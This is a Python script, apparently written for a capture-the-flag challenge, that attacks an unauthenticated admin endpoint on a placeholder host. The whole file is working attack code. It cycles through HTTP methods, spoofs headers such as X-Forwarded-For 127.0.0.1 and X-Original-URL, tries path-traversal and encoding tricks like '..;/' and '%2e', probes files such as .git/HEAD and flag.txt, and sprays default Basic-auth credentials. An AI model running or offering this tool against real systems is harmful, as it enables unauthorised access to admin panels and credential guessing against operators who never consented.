import urllib.request, urllib.error, base64, json
BASE='https://<host>/unauth/admin/'

def req(method='GET', headers=None, path=''):
    url=BASE+path
    h={'User-Agent':'Mozilla/5.0'}
    if headers: h.update(headers)
    r=urllib.request.Request(url, method=method, headers=h)
    try:
        resp=urllib.request.urlopen(r, timeout=10)
        body=resp.read(); code=resp.status; hd=resp.headers
    except urllib.error.HTTPError as e:
        body=e.read(); code=e.code; hd=e.headers
    except Exception as e:
        return ('ERR', str(e), b'')
    return (code, len(body), body)

def show(tag, code, n, body, hd=None):
    snip=body[:80].decode('latin1','replace').replace('\n',' ')
    print('%-45s %s %s %s' % (tag, code, n, snip))

tests=[]
# methods
for m in ['GET','HEAD','OPTIONS','POST','PUT','DELETE','PATCH','TRACE']:
    tests.append((m,{},''))
# bypass headers
bypass={
 'X-Forwarded-For':'127.0.0.1',
 'X-Real-IP':'127.0.0.1',
 'X-Originating-IP':'127.0.0.1',
 'X-Remote-IP':'127.0.0.1',
 'X-Client-IP':'127.0.0.1',
 'X-Forwarded-Host':'localhost',
 'X-Forwarded-Prefix':'/',
 'X-Original-URL':'/admin/',
 'X-Rewrite-URL':'/admin/',
 'X-HTTP-Method-Override':'GET',
 'Forwarded':'for=127.0.0.1',
}
for k,v in bypass.items():
    tests.append(('GET',{k:v},''))

# alternate paths
for p in ['', '.', './', '..', '../', '%2e', '%2e/', '..;/', '..%2f', '%2f', '//', '///', ';', ';/', 'index', 'flag', 'flag.txt', 'home', 'index.html', 'users', 'user', 'config', 'logs', 'export', 'api', 'panel', 'settings', 'status', 'health', 'debug', 'secret', 'robots.txt', '.git/HEAD', '%61dmin/', 'admin/', 'Admin/', 'ADMIN/']:
    tests.append(('GET',{},p))

# basic auth candidates
creds=[('admin','admin'),('admin','password'),('admin','hackrocks'),('admin','flag'),('admin',''),('',''),('root','root'),('administrator','administrator'),('admin','secret'),('admin','123456'),('admin','admin123'),('hackrocks','hackrocks')]
for u,p in creds:
    tok=base64.b64encode((u+':'+p).encode()).decode()
    tests.append(('GET',{'Authorization':'Basic '+tok},''))

for m,h,p in tests:
    tag='%s %s %s'%(m,','.join(h.keys()) if h else '-',p or '/')
    try:
        code,n,body=req(m,h,p)
    except Exception as e:
        print(tag,'EXC',e); continue
    show(tag,code,n,body)
